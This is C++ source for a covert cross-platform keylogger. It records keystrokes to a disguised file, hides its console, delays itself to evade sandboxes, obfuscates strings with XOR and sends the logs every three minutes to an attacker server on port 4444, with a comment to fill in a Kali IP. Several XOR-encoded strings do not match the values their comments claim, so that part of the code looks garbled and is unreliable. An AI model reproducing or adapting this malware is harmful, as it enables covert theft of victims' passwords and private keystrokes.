
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <string>
#include <filesystem>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <X11/Xlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#endif

// XOR string encryption
std::string decrypt(const std::vector<uint8_t>& enc, uint8_t key) {
    std::string result;
    for (auto c : enc) result += (char)(c ^ key);
    return result;
}

std::string get_log_path() {
#ifdef _WIN32
    char* appdata = getenv(decrypt({0x2, 0x18, 0x18, 0x1f, 0x1c, 0x4}, 0x7).c_str()); // "APPDATA"
    return std::string(appdata) + decrypt({0x2c, 0x38, 0x38, 0x39, 0x3f, 0x20, 0x2d, 0x38, 0x71}, 0x5); // "\\update.log"
#else
    char* home = getenv(decrypt({0x0, 0x1f, 0x19, 0x0}, 0x7).c_str()); // "HOME"
    return std::string(home) + decrypt({0x77, 0x78, 0x77, 0x7d, 0x78, 0x6b, 0x7a, 0x1b, 0x7a, 0x6d, 0x65, 0x19, 0x7a, 0x6d, 0x65}, 0x1F); // "/.cache/.keylog.txt"
#endif
}

#ifdef _WIN32
void hide_console() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}
#endif

void write_log(const std::string& text) {
    std::ofstream log(get_log_path(), std::ios::app);
    log << text;
    log.flush();
}

#ifdef _WIN32
void keylogger() {
    while (true) {
        for (int key = 8; key <= 255; ++key) {
            SHORT state = GetAsyncKeyState(key);
            if (state == -32767 || state == 1) {
                write_log(std::string(1, (char)key));
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}
#else
void keylogger() {
    Display* display = XOpenDisplay(nullptr);
    if (!display) return;
    char keys[32];
    while (true) {
        XQueryKeymap(display, keys);
        for (int i = 0; i < 32; ++i) {
            for (int j = 0; j < 8; ++j) {
                if (keys[i] & (1 << j)) {
                    int keycode = i * 8 + j;
                    write_log("[" + std::to_string(keycode) + "]");
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    XCloseDisplay(display);
}
#endif

bool send_log_file(const std::string& server_ip, int port) {
    std::ifstream file(get_log_path(), std::ios::binary);
    if (!file.is_open()) return false;
    file.seekg(0, std::ios::end);
    size_t filesize = file.tellg();
    file.seekg(0);
    char* buffer = new char[filesize];
    file.read(buffer, filesize);
    file.close();

#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return false;

    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        delete[] buffer;
        return false;
    }

    send(sockfd, buffer, filesize, 0);

#ifdef _WIN32
    closesocket(sockfd);
    WSACleanup();
#else
    close(sockfd);
#endif

    delete[] buffer;
    std::filesystem::remove(get_log_path());
    return true;
}

void exfil_loop(const std::string& server_ip, int port) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(3));  // Increased delay
        send_log_file(server_ip, port);
    }
}

int main() {
    std::this_thread::sleep_for(std::chrono::seconds(30));  // Runtime evasion: sandbox delay

#ifdef _WIN32
    hide_console();
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
#else
    if (fork()) return 0;
#endif

    std::thread(keylogger).detach();
    exfil_loop("192.168.1.10", 4444);  // Replace with your Kali server IP
    return 0;
}
